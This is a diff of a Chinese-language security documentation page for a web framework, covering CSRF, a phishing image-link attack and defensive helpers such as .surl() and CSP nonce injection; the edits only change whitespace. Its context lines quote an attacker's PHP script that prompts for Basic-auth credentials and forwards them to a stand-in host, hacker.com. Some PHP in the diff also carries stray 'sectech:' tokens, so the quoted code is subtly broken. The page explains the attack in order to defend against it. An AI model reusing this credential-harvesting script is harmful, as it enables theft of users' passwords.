@@ -392,7 +392,7 @@ CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全
 <p>攻击者可以在自己的服务器中构造以下代码：</p>
 <p>401.php：作用为弹出 401 窗口，并且记录用户信息。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">'WWW-Authenticate: Basic realm="No authorization"'</span>);</span><br><span class="line">    header(<span class="string">'HTTP/1.1 401 Unauthorized'</span>);</span><br><span class="line">        $domain = <span class="string">"http://hacker.com/fishing/"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($_SERVER[sectech:<span class="string">'PHP_AUTH_USER'</span>] !== <span class="keyword">null</span>)&#123;</span><br><span class="line">                header(<span class="string">"Location: "</span>.$domain.<span class="string">"record.php?a="</span>.$_SERVER[sectech:<span class="string">'PHP_AUTH_USER'</span>].<span class="string">"&amp;b="</span>.$_SERVER[sectech:<span class="string">'PHP_AUTH_PW'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>之后攻击者生成一个图片链接<code>&lt;img src=&quot;http://xxx.xxx.xxx/fishing/401.php?a.jpg//&quot; /&gt;</code>。</p>
+<p>之后攻击者生成一个图片链接<code>&lt;img src=&quot;http://xxx.xxx.xxx/fishing/401.php?a.jpg//&quot; /&gt; </code>。</p>
 <p>当用户访问时，会弹出信息让用户点击，用户输入的用户名及密码会被黑客的服务器偷偷记录。</p>
 <h3 id="防范方式-6"><a class="markdown-anchor" href="#防范方式-6">#</a> 防范方式</h3>
 <p>框架提供了 <code>.surl()</code> 宏做 url 过滤。</p>
@@ -464,7 +464,7 @@ CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全
 <h3 id="appinjectcsrfstr"><a class="markdown-anchor" href="#appinjectcsrfstr">#</a> app.injectCsrf(str)</h3>
 <p>这个函数提供了模板预处理－自动插入 CSRF key 的能力，可以自动在所有的 form 标签中插入 CSRF 隐藏域，用户就不需要手动写了。</p>
 <h3 id="appinjectnoncestr"><a class="markdown-anchor" href="#appinjectnoncestr">#</a> app.injectNonce(str)</h3>
-<p>这个函数提供了模板预处理－自动插入 nonce 的能力，如果网站开启了 CSP 安全头，并且想使用 <code>CSP 2.0 nonce</code> 特性，可以使用这个函数。参考 <a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener">CSP 是什么</a>。</p>
+<p>这个函数提供了模板预处理－自动插入 nonce 的能力，如果网站开启了 CSP 安全头，并且想使用 <code> CSP 2.0 nonce</code> 特性，可以使用这个函数。参考 <a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener">CSP 是什么</a>。</p>
 <p>这个函数会扫描模板中的 script 标签，并自动加上 nonce 头。</p>
 <h3 id="appinjecthijackingdefensestr"><a class="markdown-anchor" href="#appinjecthijackingdefensestr">#</a> app.injectHijackingDefense(str)</h3>
 <p>对于没有开启 HTTPS 的网站，这个函数可以有效的防止运营商劫持。</p>
